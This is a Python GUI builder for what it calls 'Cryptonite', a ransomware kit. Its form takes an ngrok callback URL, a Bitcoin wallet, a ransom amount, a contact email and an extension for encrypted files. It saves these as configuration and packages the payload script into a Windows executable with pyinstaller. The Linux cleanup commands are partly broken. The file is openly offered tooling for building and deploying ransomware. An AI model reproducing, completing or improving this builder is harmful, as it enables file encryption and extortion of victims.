import tkinter as tk
from tkinter import ttk
from tkinter.filedialog import askdirectory
import json
folder = None

def selectfolder():
    global folder
    folder = askdirectory()
    if not folder:
        return
    else:
        try:
            filesave.destroy()
            folder_frm.destroy()
        except:
            folder_frm = tk.Label(master = window, text = f"{folder}", font = ("arial", 12))
            folder_frm.grid(row = 8, column = 0, sticky = "n", columnspan = 2)
            
            restore_btn = ttk.Button(master = window, text = "Change Folder", style = "TButton", command = selectfolder)
            restore_btn.grid(row = 8, column = 0, pady = 20, sticky = "s", columnspan = 2)

def generate():
    configDict = {
        "URL": url_entry.get(),
        "BTC_AMOUNT": btcm_entry.get(),
        "BTC_WALLET": btcw_entry.get(),
        "EMAIL": email_entry.get(),
        "EXT": ext_entry.get().replace(".", "")
    }
    with open("creds.json", "w") as f:
        json.dump(configDict, f)
    import os
    OS = os.name
    if not folder:
        return
    PATH = os.path.abspath(folder)
    FILE = name_entry.get()
    if not FILE:
        return
    generate_btn.state(["disabled"])
    generate_btn.config(text = "Generating..")
    os.system(f"pyinstaller --onefile --clean --icon=\"icon.ico\" Cryptonite.py --name {FILE}")
    if OS == "nt":
        os.system(f"MOVE /Y \"{PATH}\\dist\\{FILE}.exe\" \"{PATH}\" && rmdir /Q /S __pycache__ build dist && del /Q {FILE}.spec")
    else:
        os.system(f"mv /dist/{FILE}.exe ./")
        os.system(f"rm -r __pycache__")
        os.system(f"rm -r build")
        os.system(f"rm -r dist")
        os.system(f"{FILE}.spec")
    generate_btn.config(text = "Done!")


window = tk.Tk()
window.rowconfigure([0,1,2,3,4,5,6], minsize = 30, weight = 0)
window.rowconfigure([8], minsize = 100, weight = 1)
window.resizable(0,0)
window.columnconfigure(0, minsize = 400, weight = 0)
window.columnconfigure(1, minsize = 400, weight = 0)

s = ttk.Style()
s.configure("TButton", font = (("arial", 12)))
s.configure("W.TButton", font = (("arial", 24)))

title = tk.Label(master = window, text = "exeGen: Official exe generator for Cryptonite", font = ("arial", 30))
title.grid(row = 0, column = 0, columnspan = 2, pady = (20, 40), padx = 15)

name = tk.Label(master = window, text = "NAME (for executable file): ", font = ("arial", 15))
name.grid(row = 1, column = 0, sticky = "e", pady = 20, padx = 15)
name_entry = tk.Entry(window, font = ("arial", 15))
name_entry.grid(row = 1, column = 1, sticky = "w", pady = 20, padx = 15)

url = tk.Label(master = window, text = "NGROK URL: ", font = ("arial", 15))
url.grid(row = 2, column = 0, sticky = "e", pady = 20, padx = 15)
url_entry = tk.Entry(window, font = ("arial", 15))
url_entry.grid(row = 2, column = 1, sticky = "w", pady = 20, padx = 15)

btcw = tk.Label(master = window, text = "BTC WALLET ADDRESS: ", font = ("arial", 15))
btcw.grid(row = 3, column = 0, sticky = "e", pady = 20, padx = 15)
btcw_entry = tk.Entry(window, font = ("arial", 15))
btcw_entry.grid(row = 3, column = 1, sticky = "w", pady = 20, padx = 15)

btcm = tk.Label(master = window, text = "BTC AMOUNT: ", font = ("arial", 15))
btcm.grid(row = 4, column = 0, sticky = "e", pady = 20, padx = 15)
btcm_entry = tk.Entry(window, font = ("arial", 15))
btcm_entry.grid(row = 4, column = 1, sticky = "w", pady = 20, padx = 15)

email = tk.Label(master = window, text = "EMAIL: ", font = ("arial", 15))
email.grid(row = 5, column = 0, sticky = "e", pady = 20, padx = 15)
email_entry = tk.Entry(window, font = ("arial", 15))
email_entry.grid(row = 5, column = 1, sticky = "w", pady = 20, padx = 15)

ext = tk.Label(master = window, text = "EXTENSION (default is .cryptn8): ", font = ("arial", 15))
ext.grid(row = 6, column = 0, sticky = "e", pady = 20, padx = 15)
ext_entry = tk.Entry(window, font = ("arial", 15))
ext_entry.grid(row = 6, column = 1, sticky = "w", pady = 20, padx = 15)

ext = tk.Label(master = window, text = "", font = ("arial", 15))
ext.grid(row = 7, column = 0, sticky = "e", pady = 20, padx = 15)

filesave = ttk.Button(master = window, style = "TButton", text = f"Select where to save exe file", command = selectfolder)
filesave.grid(row = 8, column = 0, columnspan = 2, pady = 20)

generate_btn = ttk.Button(master = window, style = "W.TButton", text = "Generate exe file", command = generate)
generate_btn.grid(row = 9, column = 0, columnspan = 2, pady = (10, 30))

window.mainloop()